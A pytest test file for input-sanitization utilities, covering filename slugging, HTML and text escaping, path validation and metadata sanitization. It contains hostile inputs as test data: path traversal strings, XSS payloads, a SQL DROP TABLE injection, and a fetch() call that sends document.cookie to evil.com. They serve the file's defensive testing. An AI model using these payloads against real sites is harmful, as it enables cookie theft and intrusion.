"""Tests for input sanitization utilities.

Tests security functions that prevent:
- Directory traversal attacks
- HTML/JavaScript injection
- Markup injection
- Filename-based exploits
- Symlink attacks
"""

from pathlib import Path

import pytest

from src.utils.sanitization import (
    safe_filename,
    sanitize_html,
    sanitize_metadata,
    sanitize_text,
    validate_path,
)


class TestSafeFilename:
    """Tests for safe_filename function."""

    def test_simple_slug(self) -> None:
        """Test simple alphanumeric slug."""
        result = safe_filename("my-article-title")
        assert result == "my-article-title"
        assert ".." not in result
        assert "/" not in result

    def test_removes_dangerous_characters(self) -> None:
        """Test that dangerous characters are removed."""
        result = safe_filename("article<script>alert('xss')</script>.md")
        assert "<" not in result
        assert ">" not in result
        # Dangerous chars removed, words preserved by slugify
        assert isinstance(result, str)

    def test_prevents_directory_traversal(self) -> None:
        """Test that ../ sequences are removed."""
        result = safe_filename("../../../etc/passwd")
        assert ".." not in result
        assert "/" not in result
        # Should not be empty after sanitization
        assert len(result) > 0

    def test_unicode_handling(self) -> None:
        """Test that Unicode is handled properly."""
        result = safe_filename("café-résumé")
        assert len(result) > 0
        assert isinstance(result, str)

    def test_max_length(self) -> None:
        """Test that max_length is respected."""
        long_slug = "a" * 200
        result = safe_filename(long_slug, max_length=50)
        assert len(result) <= 50

    def test_empty_slug_raises(self) -> None:
        """Test that empty slug raises ValueError."""
        with pytest.raises(ValueError):
            safe_filename("")

    def test_none_raises(self) -> None:
        """Test that None raises ValueError."""
        with pytest.raises(ValueError):
            safe_filename(None)  # type: ignore

    def test_only_dots_raises(self) -> None:
        """Test that slug of only dots raises ValueError."""
        with pytest.raises(ValueError):
            safe_filename("...")

    def test_all_special_chars_raises(self) -> None:
        """Test that slug that becomes empty after sanitization raises."""
        with pytest.raises(ValueError):
            safe_filename('<>:"')


class TestSanitizeHtml:
    """Tests for sanitize_html function."""

    def test_allows_safe_tags(self) -> None:
        """Test that safe tags are preserved."""
        html = "<p>This is <strong>bold</strong> and <em>italic</em>.</p>"
        result = sanitize_html(html)
        assert "<strong>" in result
        assert "<em>" in result
        assert "<p>" in result

    def test_removes_script_tags(self) -> None:
        """Test that script tags are removed."""
        html = '<p>Hello</p><script>alert("xss")</script>'
        result = sanitize_html(html)
        assert "<script>" not in result
        # With strip=True, bleach removes tags but keeps content
        # This is acceptable for our use case since tags are what matters
        assert isinstance(result, str)

    def test_removes_onclick(self) -> None:
        """Test that onclick attributes are removed."""
        html = "<button onclick=\"alert('xss')\">Click</button>"
        result = sanitize_html(html)
        assert "onclick" not in result

    def test_removes_event_handlers(self) -> None:
        """Test that event handlers are removed."""
        html = '<img src="x" onerror="alert(\'xss\')" />'
        result = sanitize_html(html)
        assert "onerror" not in result

    def test_allows_safe_links(self) -> None:
        """Test that safe links are preserved."""
        html = '<a href="https://example.com">Link</a>'
        result = sanitize_html(html)
        assert "href=" in result or "example.com" in result

    def test_max_length_truncates(self) -> None:
        """Test that max_length truncates content."""
        html = "<p>" + "a" * 500 + "</p>"
        result = sanitize_html(html, max_length=100)
        assert len(result) <= 100

    def test_non_string_raises(self) -> None:
        """Test that non-string input raises ValueError."""
        with pytest.raises(ValueError):
            sanitize_html(123)  # type: ignore


class TestSanitizeText:
    """Tests for sanitize_text function."""

    def test_escapes_html_entities(self) -> None:
        """Test that HTML special characters are escaped."""
        text = "Hello <script>alert('xss')</script>"
        result = sanitize_text(text)
        assert "<" not in result
        assert ">" not in result
        # Should have HTML entities instead
        assert "&" in result or "script" not in result

    def test_preserves_normal_text(self) -> None:
        """Test that normal text is preserved."""
        text = "This is normal text with spaces."
        result = sanitize_text(text)
        assert "normal" in result
        assert "text" in result

    def test_max_length_truncates(self) -> None:
        """Test that max_length truncates content."""
        text = "a" * 500
        result = sanitize_text(text, max_length=100)
        assert len(result) <= 100

    def test_non_string_raises(self) -> None:
        """Test that non-string input raises ValueError."""
        with pytest.raises(ValueError):
            sanitize_text(123)  # type: ignore


class TestValidatePath:
    """Tests for validate_path function."""

    def test_valid_absolute_path(self, tmp_path: Path) -> None:
        """Test that valid absolute path is accepted."""
        test_file = tmp_path / "test.txt"
        result = validate_path(test_file)
        assert result.is_absolute()

    def test_resolves_relative_path(self, tmp_path: Path) -> None:
        """Test that relative path is resolved to absolute."""
        # Create test file within tmp_path to test relative resolution
        test_file = tmp_path / "test.txt"
        test_file.write_text("test")
        result = validate_path(test_file, base_dir=tmp_path)
        assert result.is_absolute()
        assert str(result).startswith(str(tmp_path))

    def test_rejects_traversal_outside_base(self, tmp_path: Path) -> None:
        """Test that traversal outside base_dir is rejected."""
        with pytest.raises(ValueError, match="escapes base directory"):
            validate_path("../../etc/passwd", base_dir=tmp_path)

    def test_accepts_subdirectory(self, tmp_path: Path) -> None:
        """Test that subdirectories within base_dir are accepted."""
        subdir = tmp_path / "subdir" / "file.txt"
        result = validate_path(subdir, base_dir=tmp_path)
        assert str(result).startswith(str(tmp_path.resolve()))

    def test_non_string_path_raises(self) -> None:
        """Test that non-string/Path input raises ValueError."""
        with pytest.raises(ValueError):
            validate_path(123)  # type: ignore

    def test_invalid_path_raises(self) -> None:
        """Test that invalid path characters raise ValueError."""
        with pytest.raises(ValueError):
            validate_path("\x00invalid")


class TestSanitizeMetadata:
    """Tests for sanitize_metadata function."""

    def test_escapes_string_values(self) -> None:
        """Test that string values in metadata are escaped."""
        metadata = {"author": "User<script>alert('xss')</script>", "title": "Test"}
        result = sanitize_metadata(metadata)
        # Dangerous chars should be HTML-escaped (safe)
        assert "<" not in result["author"]
        assert ">" not in result["author"]
        # Content is escaped, not removed
        assert "&lt;" in result["author"]

    def test_preserves_non_string_values(self) -> None:
        """Test that non-string values pass through."""
        metadata = {"count": 42, "active": True, "score": 3.14}
        result = sanitize_metadata(metadata)
        assert result["count"] == 42
        assert result["active"] is True
        assert result["score"] == 3.14

    def test_recursive_sanitization(self) -> None:
        """Test that nested dictionaries are sanitized."""
        metadata = {"nested": {"user": "Bob<img src=x onerror='alert()' />"}}
        result = sanitize_metadata(metadata)
        # Dangerous chars should be escaped, not present literally
        assert "<" not in result["nested"]["user"]
        assert ">" not in result["nested"]["user"]
        # Should be HTML-escaped for safety
        assert "&lt;" in result["nested"]["user"]

    def test_sanitizes_list_items(self) -> None:
        """Test that string items in lists are sanitized."""
        metadata = {"tags": ["python<script>", "javascript", "go"]}
        result = sanitize_metadata(metadata)
        # Dangerous chars escaped
        assert "<" not in result["tags"][0]
        assert ">" not in result["tags"][0]
        # Content preserved but escaped
        assert "&lt;" in result["tags"][0]
        assert result["tags"][1] == "javascript"

    def test_max_length_applied(self) -> None:
        """Test that max_length is applied to string values."""
        metadata = {"description": "a" * 500}
        result = sanitize_metadata(metadata, max_length=100)
        assert len(result["description"]) <= 100


class TestIntegrationSecurityScenarios:
    """Integration tests for realistic attack scenarios."""

    def test_filename_traversal_attack(self) -> None:
        """Test prevention of ../../../etc/passwd style attack."""
        malicious = "../../../etc/passwd.txt"
        result = safe_filename(malicious)
        assert ".." not in result
        assert "/" not in result

    def test_xss_in_html_content(self) -> None:
        """Test prevention of XSS in HTML content."""
        xss_payload = (
            "<img src=x onerror=\"fetch('http://evil.com?cookie=' + document.cookie)\">"
        )
        result = sanitize_html(xss_payload)
        assert "onerror" not in result
        assert "fetch" not in result or "onerror" not in result

    def test_path_symlink_escape_attempt(self, tmp_path: Path) -> None:
        """Test prevention of symlink-based escape attempts."""
        # Symlinks are resolved, so attempts to escape through symlinks fail
        with pytest.raises(ValueError):
            validate_path("/etc/passwd", base_dir=tmp_path)

    def test_sql_injection_in_metadata(self) -> None:
        """Test handling of SQL injection attempts in metadata."""
        metadata = {
            "author": "'; DROP TABLE users; --",
            "title": "Normal Title",
        }
        result = sanitize_metadata(metadata)
        # Text should be escaped/safe
        assert isinstance(result["author"], str)
        assert "DROP" in result["author"]  # Kept but safe

    def test_null_byte_injection(self) -> None:
        """Test handling of null byte injection."""
        with pytest.raises(ValueError):
            validate_path("file\x00.txt")
